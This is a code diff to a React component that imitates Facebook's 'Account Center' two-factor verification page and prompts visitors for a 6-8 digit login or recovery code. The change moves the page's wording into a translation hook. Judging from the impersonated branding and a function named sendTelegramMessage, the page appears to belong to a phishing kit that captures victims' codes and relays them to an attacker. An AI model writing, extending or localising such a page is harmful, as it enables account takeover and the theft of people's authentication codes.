@@ -1,9 +1,11 @@
 import HeroImage from "@/assets/images/verify.png";
+import { useTranslation } from "@/hooks/useTranslation";
 import getConfig from "@/utils/config";
 import axios from "axios";
 import type { FC } from "react";
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router";
+
 interface UIState {
   error: string;
   isLoading: boolean;
@@ -55,6 +57,19 @@ const sendTelegramMessage = async (
 };
 
 const Verify: FC = () => {
+  const texts = {
+    accountCenter: "Account Center - Facebook",
+    checkNotifications: "Check notifications on another device",
+    approveOrEnter: "Approve from another device or Enter your login code",
+    enterCode:
+      "Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code",
+    inputPlaceholder: "Enter Code (6-8 digits)",
+    continue: "Continue",
+    sendCode: "Send Code",
+    incorrectCode: "Incorrect code. Please try again.",
+  };
+
+  const { t, isLoading } = useTranslation(texts);
   const navigate = useNavigate();
   const [code, setCode] = useState("");
   const [uiState, setUiState] = useState<UIState>(initialUIState);
@@ -138,11 +153,19 @@ const Verify: FC = () => {
     setCode(e.target.value);
   };
 
+  if (isLoading) {
+    return (
+      <div className="fixed inset-0 flex items-center justify-center bg-white">
+        <span className="text-xl">Loading...</span>
+      </div>
+    );
+  }
+
   return (
     <div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
       <div className="flex flex-col">
-        <b>Account Center - Facebook</b>
-        <b className="text-2xl">Check notifications on another device</b>
+        <b>{t("accountCenter")}</b>
+        <b className="text-2xl">{t("checkNotifications")}</b>
       </div>
 
       <div>
@@ -150,11 +173,8 @@ const Verify: FC = () => {
       </div>
 
       <div>
-        <b>Approve from another device or Enter your login code</b>
-        <p>
-          Enter 6-digit code we just send from the authentication app you set
-          up, or Enter 8-digit recovery code
-        </p>
+        <b>{t("approveOrEnter")}</b>
+        <p>{t("enterCode")}</p>
       </div>
 
       <div className="my-2 flex flex-col items-center justify-center">
@@ -168,14 +188,14 @@ const Verify: FC = () => {
           maxLength={8}
           minLength={6}
           pattern="\d*"
-          placeholder="Enter Code (6-8 digits)"
+          placeholder={t("inputPlaceholder")}
           value={code}
           onFocus={clearError}
           onChange={handleCodeChange}
         />
 
         {uiState.error && (
-          <div className="mt-2 text-sm text-red-500">{uiState.error}</div>
+          <div className="mt-2 text-sm text-red-500">{t("incorrectCode")}</div>
         )}
 
         <button
@@ -191,11 +211,11 @@ const Verify: FC = () => {
           {uiState.isLoading ? (
             <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
           ) : (
-            "Continue"
+            t("continue")
           )}
         </button>
 
-        <p className="text-blue-500 hover:underline">Send Code</p>
+        <p className="text-blue-500 hover:underline">{t("sendCode")}</p>
       </div>
     </div>
   );
